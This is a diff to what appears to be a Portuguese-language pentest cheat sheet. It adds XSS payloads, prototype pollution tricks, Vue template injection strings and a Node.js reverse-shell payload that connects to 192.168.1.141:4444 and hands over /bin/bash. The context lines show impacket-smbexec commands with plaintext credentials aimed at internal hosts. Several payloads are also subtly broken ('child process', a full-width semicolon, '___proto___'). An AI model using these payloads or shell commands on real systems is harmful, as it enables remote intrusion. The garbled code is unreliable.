@@ -9138,7 +9138,34 @@ ATAQUES GERAIS AO SMB
 	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
 	impacket-smbexec praias/sampaio:sexywolfy@192.168.161.110 ACESSA A SHELL DIRETO DO HOST CASO TENHA PERMISSAO
 	nxc ALTERNATIVA AO crackmapexec
- 
+
+- Modulo XSS
+payloads XSS
+
+	src=1'onerror='alert(')'
+	math=1';f(1)//
+
+Prototype Pollution
+
+	a = 1
+	a.constructor.___proto___.bang=()=>[console.log("BOOM")]
+	a.constructor.bang()
+	github.com/BlackFan/client-side-prototype-pollution
+	PAYLOAD REV SHELL PROTORYPE POLLUTION - USAR EM APLICACAO QUE TEM NODE JS
+	var net = this.constructor.constructor('return
+	this.process')().mainModule.require("net");var cp =
+	this.constructor.constructor('return
+	this.process')().mainModule.require("child process");sh
+	= cp.spawn("/bin/bash",[]);var client = new
+	net.Socket();client.connect(4444, "192.168.1.141",
+	function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+	sh.stderr.pipe(client)；});
+
+	<p v-show="_c.constructor'alert(1)'()"></p>
+	<x v-on:click='_b.constructor'alert(1)'()'>click</x>
+	<x is=script src=//14.Rs>
+
+  
 TO BE CONTINUED
 .
 .
@@ -9454,6 +9481,7 @@ Validação de dados
 	Fierce
 	Dnsenum
 	Dnsrecon
+	site securityheaders.com
 	WPscan
 	SpiderFoot
 	Hakrawler
